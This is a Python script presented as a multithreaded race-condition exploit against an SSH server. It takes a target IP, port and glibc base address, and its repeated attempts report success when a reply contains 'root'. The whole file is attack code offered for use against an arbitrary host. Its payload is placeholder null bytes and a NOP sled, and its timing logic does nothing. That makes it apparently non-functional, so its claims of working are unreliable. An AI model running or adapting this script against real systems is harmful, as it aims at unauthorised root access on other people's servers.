import socket
import time
import struct
import threading
import argparse

def setup_connection(ip, port):
    """Establish a connection to the target."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, port))
    return sock

def perform_ssh_handshake(sock):
    """Perform SSH handshake with the target."""
    banner = sock.recv(1024).decode()
    sock.sendall(b"SSH-2.0-Exploit\r\n")
    return banner

def prepare_heap(sock):
    """Prepare the heap for the exploit."""
    payload = b"\x00" * 1000  # Adjust payload size as necessary
    sock.sendall(payload)

def attempt_race_condition(sock, timing, glibc_base):
    """Attempt to trigger the race condition."""
    try:
        payload = struct.pack("<Q", glibc_base) + b"\x90" * 100
        sock.sendall(payload)
        sock.sendall(b"exit\r\n")
        response = sock.recv(1024)
        return b"root" in response
    except Exception as e:
        print(f"Error during race condition attempt: {e}")
        return False

def exploit_attempt(timing_adjustment, success_event, target_ip, target_port, glibc_base):
    """Perform a single attempt to exploit the race condition."""
    sock = setup_connection(target_ip, target_port)
    if not sock:
        return

    banner = perform_ssh_handshake(sock)
    print(f"Received banner: {banner.strip()}")

    prepare_heap(sock)
    time.sleep(0.1)  # Small delay before triggering the race condition

    success = attempt_race_condition(sock, time.time() + timing_adjustment, glibc_base)
    if success:
        print(f"Exploit successful!")
        success_event.set()
    else:
        print(f"Exploit failed")
        timing_adjustment += 0.00001  # Adjust timing slightly

    sock.close()

def main():
    parser = argparse.ArgumentParser(description="Race condition exploit script.")
    parser.add_argument("target_ip", type=str, help="Target IP address")
    parser.add_argument("target_port", type=int, help="Target port")
    parser.add_argument("--max_attempts", type=int, default=10000, help="Maximum number of attempts")
    parser.add_argument("--num_threads", type=int, default=10, help="Number of threads to increase race condition chances")
    parser.add_argument("--glibc_base", type=lambda x: int(x, 0), default=0xb7400000, help="glibc base address (default: 0xb7400000)")

    args = parser.parse_args()

    success_event = threading.Event()
    timing_adjustment = 0

    threads = []
    for attempt in range(args.max_attempts):
        if success_event.is_set():
            break

        for _ in range(args.num_threads):
            if success_event.is_set():
                break

            thread = threading.Thread(target=exploit_attempt, args=(timing_adjustment, success_event, args.target_ip, args.target_port, args.glibc_base))
            threads.append(thread)
            thread.start()
        
        for thread in threads:
            thread.join()

    if success_event.is_set():
        print("Exploit succeeded!")
    else:
        print("Exploit failed after maximum attempts.")

if __name__ == "__main__":
    main()
